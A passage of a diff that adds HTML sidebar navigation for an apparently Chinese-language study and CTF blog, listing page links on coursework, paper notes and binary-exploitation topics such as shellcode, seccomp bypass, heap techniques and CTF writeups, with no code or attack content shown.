+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/SM2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-SM2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/OS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    操作系统概论
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/compiler/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    编译原理
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_11" id="__nav_3_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    数据库
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_11">
+            <span class="md-nav__icon md-icon"></span>
+            数据库
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/db/db_homework/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    作业
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/db/db/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cs_e/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    计算机设计实验入门指引
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_13" id="__nav_3_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    汇编语言与接口设计
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_13">
+            <span class="md-nav__icon md-icon"></span>
+            汇编语言与接口设计
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/huibian/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/asm_homework/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    作业
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/asm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    汇编速通
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/hot100/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    hot100
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    阅读篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            阅读篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    论文
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            论文
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../READ/paperread/mHC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mHC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../READ/paperread/GCG/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    GCG越狱论文
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../READ/paperread/cs231n/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    cs231n扩展阅读
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    pwn篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            pwn篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pre/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tricks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    小技巧
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AI%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI做题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Agent 工作流
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../agent-ppt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Agent 分享
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    栈利用
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_6">
+            <span class="md-nav__icon md-icon"></span>
+            栈利用
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    汇编速通
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ASLR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ASLR绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Canary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Canary绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PIE%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PIE绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fmt-all-in-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    格式化字符串
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Shellcode
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shellcode
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      基础shellcode的书写
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="基础shellcode的书写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pwntools" class="md-nav__link">
+    <span class="md-ellipsis">
+      直接pwntools生成
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcodex86" class="md-nav__link">
+    <span class="md-ellipsis">
+      限制长度的shellcode（x86)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      字符限制shellcode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#orw" class="md-nav__link">
+    <span class="md-ellipsis">
+      orw
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      书写更短的shellcode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="书写更短的shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用残留寄存器
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      特殊指令的使用
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      寄存器复用
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      书写受限制的shellcode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="书写受限制的shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      字符限制
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      特定位置限制
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#seccomp" class="md-nav__link">
+    <span class="md-ellipsis">
+      seccomp绕过
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="seccomp绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level1-openreadwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      level1 开放open,read,write
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level2-open" class="md-nav__link">
+    <span class="md-ellipsis">
+      level2 关闭open
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level3-openat-readv-writev" class="md-nav__link">
+    <span class="md-ellipsis">
+      level3 openat readv writev
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level35-openat2-read-write" class="md-nav__link">
+    <span class="md-ellipsis">
+      level3.5 openat2 read write
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tips
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SROP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SROP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_7" id="__nav_5_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    堆利用
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_7">
+            <span class="md-nav__icon md-icon"></span>
+            堆利用
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    基础知识
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%90%84%E4%B8%AA%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    函数原型
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    堆溢出
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E6%AD%A5%E9%AA%A4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    堆溢出要点
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Off-by-one
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E5%A0%86%E5%90%84%E7%B1%BB%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    攻击手法
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Heap/%E4%BE%8B%E9%A2%98%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    例题记录
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_8" id="__nav_5_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    IO_FILE
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_8">
+            <span class="md-nav__icon md-icon"></span>
+            IO_FILE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../IO_FILE/_IO_FILE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    基础知识
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../IO_FILE/IO_FILE%E6%BA%90%E7%A0%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    源码分析
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../IO_FILE/fopen/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fopen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../IO_FILE/fread/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fread
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../IO_FILE/%E5%81%9A%E9%A2%98%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    做题技巧
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_9" id="__nav_5_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    House系列
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_9">
+            <span class="md-nav__icon md-icon"></span>
+            House系列
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../house/%E5%85%B3%E4%BA%8Ehouse%20of%20apple1%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Apple1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../house/%E5%85%B3%E4%BA%8Ehouse-of-apple2%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Apple2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../house/%E5%85%B3%E4%BA%8Ehouse%20of%20cat%20%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Cat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../house/%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Kiwi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../house/%E5%85%B3%E4%BA%8Ehouse-of-botcake%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Botcake
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_10" id="__nav_5_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_10">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/basectf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BaseCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/moectf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MoeCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/isctf2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISCTF2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ghctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    GHCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/xyctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    XYCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/tgctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TGCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NPCCTF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NPCCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CTFShow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/whuctf2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WHUCTF2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/whuctf2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WHUCTF2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    强网杯
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/polarD%26N/polarD%26N/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PolarD&N
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_10_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_10_13" id="__nav_5_10_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    BUUCTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_10_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_10_13">
+            <span class="md-nav__icon md-icon"></span>
+            BUUCTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    1-20题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    21-40题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    41-60题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
